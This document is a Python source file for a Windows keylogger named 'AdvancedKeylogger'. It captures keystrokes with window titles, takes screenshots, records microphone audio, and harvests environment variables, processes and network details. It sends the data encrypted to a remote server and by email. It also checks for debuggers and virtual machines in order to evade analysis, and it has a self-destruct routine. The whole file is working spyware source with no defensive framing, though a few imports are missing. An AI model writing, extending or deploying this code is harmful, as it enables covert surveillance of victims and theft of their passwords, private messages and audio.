import os
import sys
import time
import json
import threading
import platform
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from cryptography.fernet import Fernet
import requests
import socket
import win32gui
import win32process
import psutil
from screeninfo import get_monitors
import pyautogui
import sounddevice as sd
import numpy as np
import wave
import zlib
import base64
from datetime import datetime

class AdvancedKeylogger:
    def __init__(self):
        self.config = self.load_config()
        self.log_file = self.config.get("log_file", "system_log.json")
        self.encryption_key = self.config.get("encryption_key", Fernet.generate_key().decode())
        self.cipher = Fernet(self.encryption_key.encode())
        self.screenshot_interval = self.config.get("screenshot_interval", 300)
        self.audio_capture_interval = self.config.get("audio_capture_interval", 600)
        self.email_report_interval = self.config.get("email_report_interval", 86400)
        self.server_url = self.config.get("server_url", "")
        self.max_log_size = self.config.get("max_log_size", 1048576)  # 1MB
        self.current_window = None
        self.last_keystroke_time = time.time()
        self.log_data = {
            "keystrokes": [],
            "window_activity": [],
            "system_info": self.get_system_info(),
            "screenshots": [],
            "audio_clips": [],
            "network_info": self.get_network_info(),
            "processes": []
        }
        
        # Anti-debugging and obfuscation
        self.debugger_present = self.check_for_debugger()
        self.obfuscated_functions = {
            "log": self._obfuscated_log,
            "send": self._obfuscated_send,
            "capture": self._obfuscated_capture
        }
        
        # Set up threads
        self.threads = []
        self.running = True

    def load_config(self):
        """Load configuration from encrypted config file or create default"""
        config_path = "config.enc"
        default_config = {
            "log_file": "system_log.json",
            "encryption_key": Fernet.generate_key().decode(),
            "screenshot_interval": 300,
            "audio_capture_interval": 600,
            "email_report_interval": 86400,
            "smtp_server": "",
            "smtp_port": 587,
            "email": "",
            "email_password": "",
            "server_url": "",
            "max_log_size": 1048576,
            "encrypt_data": True
        }
        
        try:
            if os.path.exists(config_path):
                with open(config_path, "rb") as f:
                    encrypted_data = f.read()
                cipher = Fernet(default_config["encryption_key"].encode())
                decrypted_data = cipher.decrypt(encrypted_data)
                return json.loads(decrypted_data.decode())
        except Exception as e:
            pass
            
        return default_config

    def save_config(self):
        """Save encrypted configuration"""
        config_path = "config.enc"
        cipher = Fernet(self.encryption_key.encode())
        encrypted_data = cipher.encrypt(json.dumps(self.config).encode())
        with open(config_path, "wb") as f:
            f.write(encrypted_data)

    def get_system_info(self):
        """Collect comprehensive system information"""
        try:
            system_info = {
                "platform": platform.system(),
                "platform_version": platform.version(),
                "architecture": platform.architecture(),
                "processor": platform.processor(),
                "hostname": socket.gethostname(),
                "ip_address": socket.gethostbyname(socket.gethostname()),
                "mac_address": self.get_mac_address(),
                "users": self.get_system_users(),
                "displays": self.get_display_info(),
                "boot_time": psutil.boot_time(),
                "current_time": time.time(),
                "python_version": platform.python_version(),
                "environment_vars": dict(os.environ)
            }
            return system_info
        except Exception as e:
            return {"error": str(e)}

    def get_network_info(self):
        """Collect network information"""
        try:
            network_info = {
                "connections": [],
                "interfaces": []
            }
            
            # Get network connections
            for conn in psutil.net_connections():
                if conn.status == 'ESTABLISHED':
                    network_info["connections"].append({
                        "local_address": f"{conn.laddr.ip}:{conn.laddr.port}",
                        "remote_address": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else None,
                        "status": conn.status,
                        "pid": conn.pid
                    })
            
            # Get network interfaces
            for interface, addrs in psutil.net_if_addrs().items():
                interface_info = {"name": interface, "addresses": []}
                for addr in addrs:
                    interface_info["addresses"].append({
                        "family": addr.family.name,
                        "address": addr.address,
                        "netmask": addr.netmask,
                        "broadcast": addr.broadcast
                    })
                network_info["interfaces"].append(interface_info)
            
            return network_info
        except Exception as e:
            return {"error": str(e)}

    def get_mac_address(self):
        """Get MAC address of primary network interface"""
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        return addr.address
        except:
            pass
        return "00:00:00:00:00:00"

    def get_system_users(self):
        """Get list of system users"""
        try:
            return [user.name for user in psutil.users()]
        except:
            return []

    def get_display_info(self):
        """Get information about connected displays"""
        try:
            return [{"width": m.width, "height": m.height} for m in get_monitors()]
        except:
            return []

    def check_for_debugger(self):
        """Check if running under debugger"""
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            return kernel32.IsDebuggerPresent() != 0
        except:
            return False

    def _obfuscated_log(self, data):
        """Obfuscated logging function"""
        if self.debugger_present:
            return False
        
        timestamp = datetime.now().isoformat()
        if isinstance(data, dict):
            data["timestamp"] = timestamp
        else:
            data = {"timestamp": timestamp, "data": data}
        
        if self.config.get("encrypt_data", True):
            data = self.cipher.encrypt(json.dumps(data).encode()).decode()
        
        self.log_data["keystrokes"].append(data)
        
        # Check log size and rotate if needed
        if sys.getsizeof(self.log_data) > self.max_log_size:
            self.rotate_logs()
        
        return True

    def _obfuscated_send(self, data):
        """Obfuscated data sending function"""
        if self.debugger_present:
            return False
        
        try:
            if self.server_url:
                encrypted_data = self.cipher.encrypt(json.dumps(data).encode())
                compressed_data = zlib.compress(encrypted_data)
                requests.post(self.server_url, data=compressed_data, timeout=10)
            
            if self.config.get("email") and self.config.get("email_password"):
                self.send_email_report(data)
            
            return True
        except Exception as e:
            return False

    def _obfuscated_capture(self, capture_type):
        """Obfuscated data capture function"""
        if self.debugger_present:
            return False
        
        try:
            if capture_type == "screenshot":
                self.capture_screenshot()
            elif capture_type == "audio":
                self.capture_audio()
            elif capture_type == "processes":
                self.log_processes()
            return True
        except Exception as e:
            return False

    def rotate_logs(self):
        """Rotate log files when they get too large"""
        try:
            # Save current log
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"{self.log_file}.{timestamp}.bak"
            
            if self.config.get("encrypt_data", True):
                data = self.cipher.encrypt(json.dumps(self.log_data).encode())
            else:
                data = json.dumps(self.log_data).encode()
            
            with open(backup_file, "wb") as f:
                f.write(data)
            
            # Send the log
            self.obfuscated_functions["send"](self.log_data)
            
            # Clear current log
            self.log_data["keystrokes"] = []
            self.log_data["window_activity"] = []
            self.log_data["screenshots"] = []
            self.log_data["audio_clips"] = []
            self.log_data["processes"] = []
            
        except Exception as e:
            pass

    def capture_screenshot(self):
        """Capture screenshot of current screen"""
        try:
            timestamp = datetime.now().isoformat()
            screenshot = pyautogui.screenshot()
            
            # Compress and encode the image
            from io import BytesIO
            buffer = BytesIO()
            screenshot.save(buffer, format="PNG")
            image_data = buffer.getvalue()
            compressed = zlib.compress(image_data)
            encoded = base64.b64encode(compressed).decode()
            
            self.log_data["screenshots"].append({
                "timestamp": timestamp,
                "data": encoded,
                "size": len(compressed),
                "format": "PNG"
            })
        except Exception as e:
            pass

    def capture_audio(self, duration=10):
        """Capture audio from microphone"""
        try:
            timestamp = datetime.now().isoformat()
            sample_rate = 44100
            channels = 1
            
            # Record audio
            audio_data = sd.rec(int(duration * sample_rate), 
                                samplerate=sample_rate, 
                                channels=channels, 
                                dtype='int16')
            sd.wait()
            
            # Save to buffer
            buffer = BytesIO()
            with wave.open(buffer, 'wb') as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(2)
                wf.setframerate(sample_rate)
                wf.writeframes(audio_data.tobytes())
            
            audio_bytes = buffer.getvalue()
            compressed = zlib.compress(audio_bytes)
            encoded = base64.b64encode(compressed).decode()
            
            self.log_data["audio_clips"].append({
                "timestamp": timestamp,
                "data": encoded,
                "duration": duration,
                "sample_rate": sample_rate,
                "channels": channels,
                "size": len(compressed),
                "format": "WAV"
            })
        except Exception as e:
            pass

    def log_processes(self):
        """Log running processes"""
        try:
            timestamp = datetime.now().isoformat()
            processes = []
            
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                try:
                    processes.append({
                        "pid": proc.info['pid'],
                        "name": proc.info['name'],
                        "user": proc.info['username'],
                        "memory": proc.info['memory_info'].rss,
                        "cpu": proc.info['cpu_percent']
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    continue
            
            self.log_data["processes"].append({
                "timestamp": timestamp,
                "process_list": processes
            })
        except Exception as e:
            pass

    def get_active_window(self):
        """Get information about the currently active window"""
        try:
            window = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(window)[1]
            title = win32gui.GetWindowText(window)
            
            try:
                process = psutil.Process(pid)
                exe = process.exe()
                cmdline = process.cmdline()
            except:
                exe = ""
                cmdline = []
            
            return {
                "window_title": title,
                "process_id": pid,
                "executable": exe,
                "command_line": cmdline
            }
        except:
            return None

    def on_press(self, key):
        """Callback for key press events"""
        try:
            current_window = self.get_active_window()
            
            # Log window change if different from last window
            if current_window and (not self.current_window or 
                                  current_window["window_title"] != self.current_window["window_title"]):
                self.current_window = current_window
                self.log_data["window_activity"].append({
                    "timestamp": datetime.now().isoformat(),
                    "action": "window_change",
                    "data": current_window
                })
            
            # Log the keystroke
            key_data = {
                "key": str(key),
                "window": current_window["window_title"] if current_window else None,
                "process": current_window["executable"] if current_window else None
            }
            
            self.obfuscated_functions["log"](key_data)
            self.last_keystroke_time = time.time()
            
            # Check if we should capture additional data
            if random.random() < 0.01:  # 1% chance on each keystroke
                self.obfuscated_functions["capture"]("processes")
            
        except Exception as e:
            pass
        
        # Return False to stop the listener if needed
        return self.running

    def send_email_report(self, data):
        """Send encrypted email report"""
        try:
            if not self.config.get("email") or not self.config.get("email_password"):
                return False
            
            message = MIMEMultipart()
            message["From"] = self.config["email"]
            message["To"] = self.config["email"]
            message["Subject"] = f"Keylogger Report - {socket.gethostname()}"
            
            # Encrypt and compress the data
            encrypted_data = self.cipher.encrypt(json.dumps(data).encode())
            compressed_data = zlib.compress(encrypted_data)
            encoded_data = base64.b64encode(compressed_data).decode()
            
            # Attach the data
            message.attach(MIMEText("See attached report data", "plain"))
            attachment = MIMEText(encoded_data, "plain")
            attachment.add_header("Content-Disposition", "attachment", filename="report.enc")
            message.attach(attachment)
            
            # Send the email
            context = ssl.create_default_context()
            with smtplib.SMTP(self.config["smtp_server"], self.config["smtp_port"]) as server:
                server.starttls(context=context)
                server.login(self.config["email"], self.config["email_password"])
                server.send_message(message)
            
            return True
        except Exception as e:
            return False

    def screenshot_thread(self):
        """Thread for periodic screenshot capture"""
        while self.running:
            time.sleep(self.screenshot_interval)
            self.obfuscated_functions["capture"]("screenshot")

    def audio_thread(self):
        """Thread for periodic audio capture"""
        while self.running:
            time.sleep(self.audio_capture_interval)
            self.obfuscated_functions["capture"]("audio")

    def reporting_thread(self):
        """Thread for periodic data reporting"""
        while self.running:
            time.sleep(self.email_report_interval)
            self.rotate_logs()

    def inactivity_thread(self):
        """Thread to check for inactivity"""
        while self.running:
            if time.time() - self.last_keystroke_time > 600:  # 10 minutes inactivity
                self.obfuscated_functions["capture"]("screenshot")
                self.last_keystroke_time = time.time()
            time.sleep(60)

    def start(self):
        """Start the keylogger"""
        try:
            # Start keyboard listener
            listener = keyboard.Listener(on_press=self.on_press)
            listener.start()
            
            # Start background threads
            threads = [
                threading.Thread(target=self.screenshot_thread),
                threading.Thread(target=self.audio_thread),
                threading.Thread(target=self.reporting_thread),
                threading.Thread(target=self.inactivity_thread)
            ]
            
            for t in threads:
                t.daemon = True
                t.start()
                self.threads.append(t)
            
            # Save config if it's the first run
            if not os.path.exists("config.enc"):
                self.save_config()
            
            # Main loop
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            self.stop()

    def stop(self):
        """Stop the keylogger and clean up"""
        self.running = False
        for t in self.threads:
            t.join(timeout=1)
        
        # Save final logs
        self.rotate_logs()

    def self_destruct(self):
        """Remove all traces of the keylogger"""
        try:
            self.stop()
            if os.path.exists(self.log_file):
                os.remove(self.log_file)
            if os.path.exists("config.enc"):
                os.remove("config.enc")
            # Remove persistence mechanisms would go here
        except:
            pass

if __name__ == "__main__":
    # Basic anti-analysis checks
    if platform.system() == "Linux" or "debug" in sys.argv or "pytest" in sys.modules:
        print("This application is not designed to run in this environment.")
        sys.exit(1)
    
    # Check for sandbox/virtual environment
    vm_indicators = [
        "vbox" in platform.platform().lower(),
        "vmware" in platform.platform().lower(),
        "qemu" in platform.platform().lower(),
        "sandbox" in platform.platform().lower()
    ]
    
    if any(vm_indicators):
        print("Virtual environment detected. Exiting.")
        sys.exit(1)
    
    # Run the keylogger
    keylogger = AdvancedKeylogger()
    try:
        keylogger.start()
    except Exception as e:
        keylogger.stop()